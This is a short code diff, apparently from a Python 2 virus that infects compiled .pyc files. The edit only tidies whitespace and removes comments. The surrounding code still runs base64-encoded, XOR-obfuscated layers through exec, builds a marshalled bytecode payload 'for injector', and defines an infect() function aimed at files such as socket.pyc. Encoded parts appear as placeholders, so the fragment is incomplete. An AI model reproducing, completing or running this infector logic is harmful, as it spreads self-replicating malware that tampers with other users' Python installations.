@@ -10,13 +10,12 @@ from base64 import b64decode, b64encode
 a = None
 DECRYPT = None
 exec b64decode("__XOR_LAYER_PY__")
-crypt=a
+crypt = a
 
 if __file__.endswith('.pyc'):
     template = b64decode("__TEMPLATE_PY__")
     template = template.replace("__DECRYPT_PLACEHOLDER__", DECRYPT)
 
-    # ------------- GENERATING BYTEPLAY DATA (for injector) ---------------
     LOAD_CONST = None
     RETURN_VALUE = None
     Code = None
@@ -43,8 +42,6 @@ if __file__.endswith('.pyc'):
     data.code.append((RETURN_VALUE, None))
     payload_clear = zlib.compress(marshal.dumps(data.to_code()))
 
-
-    # ------------- GENERATING PAYLOAD DATA ---------------
     def infect(f_to_infect):
         #print "j'infecte %s" % f_to_infect
         if f_to_infect.endswith("socket.pyc"):
